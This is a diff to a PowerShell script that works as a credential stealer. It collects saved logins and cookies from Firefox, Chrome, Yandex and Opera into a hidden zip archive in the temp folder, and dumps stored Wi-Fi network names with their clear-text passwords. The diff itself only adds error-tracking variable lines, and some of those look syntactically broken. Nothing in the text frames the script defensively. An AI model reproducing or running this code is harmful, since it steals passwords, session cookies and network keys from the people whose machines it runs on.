@@ -1,4 +1,5 @@
 echo "qwe"
+$e=""
 $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
 
 if(Test-Path -Path "C:\Program Files\WinRAR222\WinRAR.exe")
@@ -15,7 +16,7 @@ if(Test-Path -Path $f)
     {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}
   echo "Mqwe"
 }
-else{echo "Masd"}
+else{echo "Masd" | $e=$e'Masd'}
 
 $g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");
 if(Test-Path -Path $g){
@@ -26,7 +27,7 @@ if(Test-Path -Path $g){
     {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}
   echo "Gqwe"
 }
-else{echo "Gasd"}
+else{echo "Gasd" | $e=$e'Gasd'}
 
 $y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");
 if(Test-Path -Path $y){
@@ -37,7 +38,7 @@ if(Test-Path -Path $y){
     {.\7z.exe a $p ($y+"Ya Passman Data") -spf -tzip | .\7z.exe a $p ($y+"Cookies") -spf -tzip}
   echo "Yqwe"
 }
-else{echo "Yasd"}
+else{echo "Yasd" | $e=$e'Yasd'}
 
 $o=($env:APPDATA+"\Opera Software\Opera Stable\");
 if(Test-Path -Path $o){
@@ -48,7 +49,7 @@ if(Test-Path -Path $o){
     {.\7z.exe a $p ($o+"Login Data") -spf -tzip | .\7z.exe a $p ($o+"Cookies") -spf -tzip}
   echo "Oqwe"
 }
-else{echo "Oasd"}
+else{echo "Oasd" | $e=$e'Oasd'}
 
 
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
